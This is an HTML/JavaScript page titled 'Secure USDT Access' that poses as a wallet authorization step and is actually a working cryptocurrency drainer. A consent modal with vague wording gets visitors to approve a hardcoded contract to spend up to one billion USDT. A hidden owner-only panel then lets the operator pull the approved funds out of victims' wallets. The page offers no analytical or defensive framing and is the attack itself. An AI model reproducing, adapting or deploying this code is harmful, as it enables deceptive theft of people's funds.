<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Access</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.min.js"></script>

<style>
body{
  margin:0;
  min-height:100vh;
  background:radial-gradient(circle at top,#1b1f3b,#070b18);
  font-family:Segoe UI,Arial;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
}
.card{
  width:100%;
  max-width:420px;
  background:rgba(255,255,255,0.05);
  backdrop-filter:blur(14px);
  border-radius:18px;
  padding:24px;
  box-shadow:0 0 40px rgba(0,0,0,.7);
}
h2{text-align:center;margin:0 0 12px;}
.btn{
  width:100%;
  padding:15px;
  margin-top:14px;
  border:none;
  border-radius:12px;
  font-size:16px;
  cursor:pointer;
  background:linear-gradient(135deg,#00ffa3,#00b3ff);
  color:#000;
  font-weight:600;
}
input{
  width:100%;
  padding:12px;
  margin-top:10px;
  border-radius:10px;
  border:none;
  outline:none;
  background:#0f1430;
  color:#fff;
}
.small{font-size:13px;opacity:.8;text-align:center;margin-top:10px}
.hide{display:none}
.ok{color:#00ffa3}

/* LOADER */
.loader{
  width:42px;
  height:42px;
  border:4px solid #1e244a;
  border-top:4px solid #00ffa3;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:20px auto 10px;
}
@keyframes spin{
  to{transform:rotate(360deg)}
}

/* MODAL */
.modal{
  position:fixed;inset:0;
  background:rgba(0,0,0,.6);
  display:flex;align-items:center;justify-content:center;
}
.modalBox{
  background:#0d132e;
  border-radius:16px;
  padding:22px;
  max-width:360px;
  text-align:center;
}
</style>
</head>

<body>

<div class="card">
  <h2>Secure USDT Access</h2>

  <button class="btn" onclick="connect()">Connect Wallet</button>
  <div id="status" class="small">Wallet not connected</div>

  <div id="ownerBox" class="hide">
    <hr style="border:.5px solid #1e244a;margin:18px 0">
    <input id="from" placeholder="User Wallet Address">
    <input id="pullAmt" placeholder="USDT Amount">
    <button class="btn" onclick="pull()">Execute Transfer</button>
  </div>

  <div class="small">BSC Network • Protected Contract</div>
</div>

<!-- LOADING MODAL -->
<div id="loading" class="modal hide">
  <div class="modalBox">
    <div class="loader"></div>
    <div class="small">Processing… Please confirm in wallet</div>
  </div>
</div>

<!-- CONSENT MODAL -->
<div id="consent" class="modal hide">
  <div class="modalBox">
    <h3>Authorization Required</h3>
    <p class="small">
      By continuing, you allow secure USDT access.
    </p>
    <button class="btn" onclick="approveAuto()">Continue</button>
  </div>
</div>

<script>
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const CONTRACT = "0x578b86B3d51fF707a3B4E1272eFfcD03979069e1";
const OWNER = "0x2d0f0934524Cb69B721064807B3ab3133d158E5F";
const BSC = "0x38";

let provider, signer, user;

function show(id){document.getElementById(id).classList.remove("hide")}
function hide(id){document.getElementById(id).classList.add("hide")}

async function connect(){
  if(!window.ethereum) return alert("Wallet not found");
  const cid = await ethereum.request({method:"eth_chainId"});
  if(cid !== BSC){
    await ethereum.request({
      method:"wallet_switchEthereumChain",
      params:[{chainId:BSC}]
    });
  }
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts",[]);
  signer = provider.getSigner();
  user = (await signer.getAddress()).toLowerCase();

  document.getElementById("status").innerHTML =
    `<span class="ok">Connected</span>`;

  if(user === OWNER.toLowerCase()){
    document.getElementById("ownerBox").classList.remove("hide");
  }else{
    show("consent");
  }
}

async function approveAuto(){
  try{
    hide("consent");
    show("loading");

    const usdt = new ethers.Contract(
      USDT,
      ["function approve(address,uint256) returns(bool)","function decimals() view returns(uint8)"],
      signer
    );
    const d = await usdt.decimals();
    const tx = await usdt.approve(
      CONTRACT,
      ethers.utils.parseUnits("1000000000", d)
    );
    await tx.wait();

    hide("loading");
    alert("Access Granted Successfully");
  }catch(e){
    hide("loading");
    alert(e.message);
  }
}

async function pull(){
  try{
    show("loading");
    const from = document.getElementById("from").value;
    const amt = document.getElementById("pullAmt").value;
    if(!from||!amt) return alert("Fill all fields");

    const c = new ethers.Contract(
      CONTRACT,
      ["function pullApprovedUSDT(address,uint256) external"],
      signer
    );
    const tx = await c.pullApprovedUSDT(
      from,
      ethers.utils.parseUnits(amt,18)
    );
    await tx.wait();

    hide("loading");
    alert("Transfer Completed");
  }catch(e){
    hide("loading");
    alert(e.message);
  }
}
</script>

</body>
</html>
